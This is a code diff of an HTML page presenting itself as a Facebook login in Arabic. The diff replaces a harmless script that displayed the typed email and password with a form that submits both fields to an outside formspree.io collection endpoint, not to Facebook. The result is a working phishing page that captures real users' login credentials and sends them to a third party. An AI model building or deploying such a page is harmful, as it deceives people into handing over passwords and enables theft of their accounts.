@@ -34,30 +34,16 @@
       border: none;
       font-size: 16px;
     }
-    #result {
-      margin-top: 20px;
-      font-weight: bold;
-      color: #333;
-    }
   </style>
 </head>
 <body>
   <div class="login-box">
     <h2>تسجيل الدخول إلى فيسبوك</h2>
-    <input id="email" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف">
-    <input id="password" type="password" placeholder="كلمة المرور">
-    <button onclick="sendData()">تسجيل الدخول</button>
-    <div id="result"></div>
+    <form action="https://formspree.io/f/mldnoqav" method="POST">
+      <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      <input type="password" name="password" placeholder="كلمة المرور" required>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
   </div>
-
-  <script>
-    function sendData() {
-      let email = document.getElementById("email").value;
-      let password = document.getElementById("password").value;
-
-      document.getElementById("result").innerHTML =
-        "📧 البريد: " + email + "<br>🔑 كلمة المرور: " + password;
-    }
-  </script>
 </body>
 </html>
